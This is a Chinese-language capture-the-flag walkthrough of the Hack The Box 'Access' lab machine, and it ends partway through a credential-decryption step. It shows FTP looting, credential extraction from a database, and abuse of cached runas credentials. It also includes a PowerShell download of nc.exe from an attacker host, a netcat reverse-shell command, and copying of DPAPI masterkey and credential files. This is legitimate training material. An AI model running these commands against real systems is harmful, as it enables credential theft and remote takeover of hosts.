对目标服务器进行端口探测

```
sudo nmap -p- --min-rate 10000 10.10.10.98 -open
```

![image-20241014152456539](https://s2.loli.net/2024/10/14/XVsYzuTj3I8aHZy.png)

对开放端口进行进一步的服务探测

```
sudo nmap -p21,23,80 -A 10.10.10.98 -oX Access.xml
```

![image-20241014152620873](https://files.seeusercontent.com/2026/04/06/i9mY/image-20241014152620873.png)

优先从21端口出发进行探测，尝试进行匿名登录

![image-20241014154458379](https://s2.loli.net/2024/10/14/egouta5EsZfj7Fh.png)

发现能够成功登录访问，针对文件夹中的内容进行下载和查看

backups文件中存在一个backup.mdb的access数据库文件，engineer文件夹中存在一个access control.zip文件

尝试解压zip文件会出现报错“unsupported compression method 99”，经过搜索发现是因为该zip文件为aes加密文件，需要密码解密

![image-20241014161142114](https://s2.loli.net/2024/10/14/4tYrVTmDObaCyEA.png)

我们优先mdb文件，但使用mdbtools命令反复尝试均存在问题，故怀疑是文件本身因为不是通过二进制等传输，存在文件损坏，更换文件下载方式

```
wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98
```

![image-20241014164202137](https://s2.loli.net/2024/10/14/9mPORaA4lMgHw72.png)

再次执行命令，可以正常运行，文件正常，使用mdb-sql工具整体格式会正常，我们在非常多的表中找到一个auth_user的表，从中获取到以下数据内容

```
mdb-export backup.mdb auth_user
```

![image-20241014164835855](https://s2.loli.net/2024/10/14/rbjYmuh1pl2gQKf.png)

```
"admin","admin"
"engineer","access4u@security"
"backup_admin","admin"
```

我们还有以下的办法来确定哪些表中存在数据，然后逐表进行检查

```
mdb-tables backup.mdb | tr ' ' '\n' | grep . | while read table; do lines=$(mdb-export backup.mdb $table | wc -l); if [ $lines -gt 1 ]; then echo "$table: $lines"; fi; done
```

![image-20241014165045765](https://s2.loli.net/2024/10/14/9NUwRHXzJnomh4D.png)

考虑到我们获取到的另外一个zip文件需要密码，且对应的文件夹名称为engineer，故考虑对应的密码是否为其解压密码

```
7za x Access\ Control.zip
```

解压获得一个pst格式的文件，经过查询pst格式为outlook个人用户信息存储文件

![image-20241014165434934](https://s2.loli.net/2024/10/14/eMScwukVht4ROxs.png)

经过搜索kali内置了readpst工具用于将pst文件转换为mbox文本文件

```
readpst Access\ Control.pst
cat Access\ Control.mbox
```

经过逐个文件夹的内容查找，在public目录下desktop中找到一个link文件，同时逐个文件夹需要使用dir /a命令才能展示

![image-20241014180004989](https://files.seeusercontent.com/2026/04/06/bHb7/image-20241014180004989.png)

看到调用了runas.exe ，user是access\administrator ，/savecred参数用来缓存creds凭证

使用以下命令，来验证本次是否存在creds凭证

```
cmdkey /list
```

![image-20241014180657456](https://s2.loli.net/2024/10/14/1jAgaETi6LuBl4k.png)

确实存在，那么我们就需要利用本地的凭证来登录，优先在本地开启侦听端口

```
powershell -Command "(New-Object Net.WebClient).DownloadFile('http://10.10.16.12/nc.exe', 'nc.exe')"
runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c C:\Users\security\nc.exe -e C:\Windows\System32\cmd.exe 10.10.16.12 12345"
```

![image-20241014214333295](https://s2.loli.net/2024/10/14/okAiQ69sePXLDrT.png)



也有第二种方法直接读取对应的rootflag

```
runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c type C:\Users\Administrator\Desktop\root.txt > C:\Users\security\out.txt"
```

![image-20241014182013329](https://files.seeusercontent.com/2026/04/07/Pk1b/image-20241014182013329.png)



第三种方法，因为本地存在密钥缓存，直接提取对应文件的内容进行解密
文件1：主密钥

```
cd C:\Users\security\AppData\Roaming\Microsoft\Protect\
dir /a
cd S-1-5-21-953262931-566350628-63446256-1001
dir /a
certutil -encode 0792c32e-48a5-4fe3-8b43-d93d64590580 output
type output
```

![image-20241014182435896](https://s2.loli.net/2024/10/14/M9ZfjPol13HWGez.png)

将主密钥复制到攻击端，命名为masterkey.b64（只保存base64的部分）

```
cat masterkey.b64 | base64 -d > masterkey
```

文件2：凭证文件

```
cd C:\Users\security\AppData\Roaming\Microsoft\Credentials
dir /a
certutil -encode 51AB168BE4BDB3A603DADE4F8CA81290 output
type output
```

![image-20241014182740151](https://s2.loli.net/2024/10/14/ABfpuw8FjeLKkmE.png)

将主密钥复制到攻击端，命名为credentials.b64（只保存base64的部分）

```
cat credentials.b64 | base64 -d > credentials
```
